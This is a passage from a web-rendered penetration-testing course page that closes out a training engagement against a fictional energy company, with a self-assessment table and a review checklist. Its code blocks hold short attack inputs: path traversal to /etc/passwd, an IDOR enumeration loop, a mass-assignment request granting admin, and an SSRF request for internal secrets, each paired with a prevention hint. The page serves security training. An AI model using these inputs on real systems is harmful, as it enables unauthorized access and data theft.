+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># Basic traversal
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>/download?file=../../../etc/passwd
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># URL-encoded
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a># Prevention: Canonicalize and verify path prefix
+</code></pre></div>
+<h3 id="api-exploitation-chain">API Exploitation Chain</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a># IDOR enumeration
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>for i in $(seq 1 100); do curl -H &quot;Auth: Bearer $T&quot; /api/alerts/$i; done
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a># Mass assignment
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>curl -X PUT -d &#39;{&quot;name&quot;:&quot;User&quot;,&quot;role&quot;:&quot;admin&quot;}&#39; /api/user/profile
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a># SSRF
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>curl -X POST -d &#39;{&quot;url&quot;:&quot;http://internal:5000/secrets&quot;}&#39; /api/admin/fetch
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a># Prevention: Authorization checks, field allowlists, URL validation
+</code></pre></div>
+<h2 id="self-assessment">Self-Assessment</h2>
+<p>Rate your confidence on each skill from the engagement:</p>
+<table>
+<thead>
+<tr>
+<th>Skill</th>
+<th style="text-align: center;">Not Confident</th>
+<th style="text-align: center;">Somewhat</th>
+<th style="text-align: center;">Confident</th>
+<th style="text-align: center;">Expert</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network reconnaissance and service enumeration</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Web application exploitation</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Path traversal attack and defense</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>API vulnerability identification (IDOR, mass assignment, SSRF)</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>LDAP injection concepts and exploitation</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Jinja2 SSTI detection and RCE</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Credential discovery from environment variables</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Lateral movement via database access</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Vulnerability chaining across multiple systems</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>MITRE ATT&amp;CK mapping of attack techniques</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+<tr>
+<td>Writing remediation recommendations by priority</td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+<td style="text-align: center;"></td>
+</tr>
+</tbody>
+</table>
+<h3 id="review-checklist">Review Checklist</h3>
+<p>Before considering the Meridian Energy engagement complete, verify:</p>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you reproduce the LDAP wildcard injection without referencing the walkthrough?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you explain why <code>cycler.__init__.__globals__</code> provides access to the <code>os</code> module?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you construct a psql one-liner from memory to query a remote PostgreSQL database?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you map each exercise to MITRE ATT&amp;CK tactics and techniques?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you explain the difference between LDAP search-filter authentication and bind authentication?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you describe three defenses against SSRF?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you prioritize remediations and justify the ordering?</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Can you draw the full attack chain from Chapter 1 through Chapter 4 without looking?</li>
+</ul>
+<h2 id="what-comes-next">What Comes Next</h2>
+<p>The Meridian Energy engagement covered the most common vulnerability classes in corporate and OT-adjacent environments. To continue building skills:</p>
+<ul>
+<li><strong>Practice LDAP injection</strong> on deliberately vulnerable applications (DVWA, WebGoat, Juice Shop)</li>
+<li><strong>Study SSTI</strong> across multiple template engines (Jinja2, Twig, Freemarker, Velocity) using the PayloadsAllTheThings repository</li>
+<li><strong>Explore OT security</strong> through ICS-CERT advisories and SANS ICS courses to understand real-world SCADA vulnerabilities</li>
+<li><strong>Build detection rules</strong> for the techniques used in this engagement: write Suricata or Snort rules for path traversal, SSTI payloads, and LDAP injection patterns</li>
+<li><strong>Review the MITRE ATT&amp;CK for ICS framework</strong> which maps industrial control system attack techniques separately from enterprise IT techniques</li>
+</ul>
+<p>The skills developed across the four Meridian Energy chapters, including reconnaissance, web exploitation, infrastructure attacks, and multi-phase attack chaining, apply directly to real-world penetration testing engagements in the energy, utilities, and critical infrastructure sectors.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
